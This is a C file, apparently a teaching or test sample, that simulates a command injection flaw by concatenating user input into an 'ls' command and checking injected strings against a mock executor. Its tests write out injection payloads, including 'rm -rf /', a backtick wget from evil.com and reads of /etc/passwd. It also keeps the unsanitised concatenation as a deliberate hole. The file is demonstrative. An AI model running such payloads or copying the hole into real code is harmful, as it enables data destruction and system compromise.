/* Unsafe command execution with user input concatenated without sanitization.
 * Simulates command injection vulnerability using string operations.
 * Commands are NOT actually executed -- only string patterns are checked.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>
#include <stdbool.h>

typedef struct {
    char output[1024];
    char error[1024];
    char command[2048];
    bool has_output;
    bool has_error;
} CommandResult;

/* Check if string contains any of the given characters */
static bool contains_any(const char *s, const char *chars) {
    for (const char *c = chars; *c; c++) {
        if (strchr(s, *c)) return true;
    }
    return false;
}

/* Check if string contains a substring */
static bool contains(const char *haystack, const char *needle) {
    return strstr(haystack, needle) != NULL;
}

CommandResult execute_command(const char *command) {
    CommandResult cr;
    memset(&cr, 0, sizeof(cr));
    strncpy(cr.command, command, sizeof(cr.command) - 1);

    /* Check for command injection patterns */
    if (contains_any(command, ";|&`") || strstr(command, "$(") || strchr(command, ')')) {
        if (contains(command, "rm") || contains(command, "del")) {
            cr.has_error = true;
            strncpy(cr.error, "DESTRUCTIVE_COMMAND_ATTEMPTED", sizeof(cr.error) - 1);
        } else if (contains(command, "wget") || contains(command, "curl")) {
            cr.has_error = true;
            strncpy(cr.error, "NETWORK_ACCESS_ATTEMPTED", sizeof(cr.error) - 1);
        } else if (contains(command, "cat") && contains(command, "/etc/passwd")) {
            cr.has_error = true;
            strncpy(cr.error, "SENSITIVE_FILE_ACCESS", sizeof(cr.error) - 1);
        } else if (contains(command, "whoami")) {
            cr.has_output = true;
            strncpy(cr.output, "injected_user", sizeof(cr.output) - 1);
        } else {
            cr.has_error = true;
            strncpy(cr.error, "COMMAND_INJECTION_DETECTED", sizeof(cr.error) - 1);
        }
        return cr;
    }

    /* Check for redirect operators */
    if (strchr(command, '>') || strchr(command, '<')) {
        cr.has_error = true;
        strncpy(cr.error, "REDIRECT_OPERATOR_DETECTED", sizeof(cr.error) - 1);
        return cr;
    }

    /* Check for env var expansion */
    if (strchr(command, '$')) {
        cr.has_error = true;
        strncpy(cr.error, "ENV_VAR_EXPANSION_DETECTED", sizeof(cr.error) - 1);
        return cr;
    }

    /* Normal command: check allowed commands */
    const char *allowed[] = {"ls", "cat", "echo", "whoami", "pwd"};
    int num_allowed = 5;

    /* Extract first token */
    char cmd_copy[2048];
    strncpy(cmd_copy, command, sizeof(cmd_copy) - 1);
    cmd_copy[sizeof(cmd_copy) - 1] = '\0';
    char *first_token = strtok(cmd_copy, " ");

    if (first_token) {
        bool allowed_cmd = false;
        for (int i = 0; i < num_allowed; i++) {
            if (strcmp(first_token, allowed[i]) == 0) {
                allowed_cmd = true;
                if (strcmp(first_token, "ls") == 0) {
                    cr.has_output = true;
                    strncpy(cr.output, "file1.txt file2.txt", sizeof(cr.output) - 1);
                } else if (strcmp(first_token, "cat") == 0) {
                    char *arg = strtok(NULL, " ");
                    if (arg && strstr(arg, "passwd")) {
                        cr.has_error = true;
                        strncpy(cr.error, "SENSITIVE_FILE_ACCESS", sizeof(cr.error) - 1);
                    } else {
                        cr.has_output = true;
                        strncpy(cr.output, "file contents", sizeof(cr.output) - 1);
                    }
                } else if (strcmp(first_token, "echo") == 0) {
                    /* Collect rest of tokens */
                    char *rest = strtok(NULL, "");
                    cr.has_output = true;
                    if (rest)
                        strncpy(cr.output, rest, sizeof(cr.output) - 1);
                    else
                        cr.output[0] = '\0';
                } else if (strcmp(first_token, "whoami") == 0) {
                    cr.has_output = true;
                    strncpy(cr.output, "current_user", sizeof(cr.output) - 1);
                } else if (strcmp(first_token, "pwd") == 0) {
                    cr.has_output = true;
                    strncpy(cr.output, "/current/directory", sizeof(cr.output) - 1);
                }
                break;
            }
        }
        if (!allowed_cmd) {
            cr.has_error = true;
            strncpy(cr.error, "COMMAND_NOT_ALLOWED", sizeof(cr.error) - 1);
        }
    } else {
        cr.has_error = true;
        strncpy(cr.error, "COMMAND_NOT_ALLOWED", sizeof(cr.error) - 1);
    }

    return cr;
}

CommandResult unsafe_command_execution(const char *user_input) {
    /* Dangerous: directly concatenate user input into command */
    char command[2048];
    snprintf(command, sizeof(command), "ls %s", user_input);
    return execute_command(command);
}

void check(void) {
    /* 1) Normal case */
    CommandResult r1 = unsafe_command_execution(".");
    assert(r1.has_output);
    assert(strstr(r1.output, "file1.txt file2.txt") != NULL);

    /* 2) Command injection: semicolon separator */
    CommandResult r2 = unsafe_command_execution(".; whoami");
    assert(r2.has_error || strstr(r2.output, "injected_user") != NULL);

    /* 3) Command injection: pipe separator */
    CommandResult r3 = unsafe_command_execution(". | cat /etc/passwd");
    assert(r3.has_error);
    assert(strstr(r3.error, "SENSITIVE_FILE_ACCESS") != NULL);

    /* 4) Command injection: ampersand separator */
    CommandResult r4 = unsafe_command_execution(". & rm -rf /");
    assert(r4.has_error);
    assert(strstr(r4.error, "DESTRUCTIVE_COMMAND_ATTEMPTED") != NULL);

    /* 5) Command injection: backtick execution */
    CommandResult r5 = unsafe_command_execution(". `wget http://evil.com/malware`");
    assert(r5.has_error);
    assert(strstr(r5.error, "NETWORK_ACCESS_ATTEMPTED") != NULL);

    /* 6) Command injection: multiple separators */
    CommandResult r6 = unsafe_command_execution(".; cat /etc/passwd; whoami");
    assert(r6.has_error);

    /* 7) Command injection: nested commands */
    CommandResult r7 = unsafe_command_execution(". $(echo 'cat /etc/passwd')");
    assert(r7.has_error);

    /* 8) Edge case: empty input */
    CommandResult r8 = unsafe_command_execution("");
    assert(r8.has_output);

    /* 9) Command injection: redirect operators */
    CommandResult r9 = unsafe_command_execution(". > /tmp/evil.txt");
    assert(r9.has_error);

    /* 10) Command injection: environment variable expansion */
    CommandResult r10 = unsafe_command_execution(". $PATH");
    assert(r10.has_error);
}

int main(void) {
    check();
    printf("All tests passed.\n");
    return 0;
}
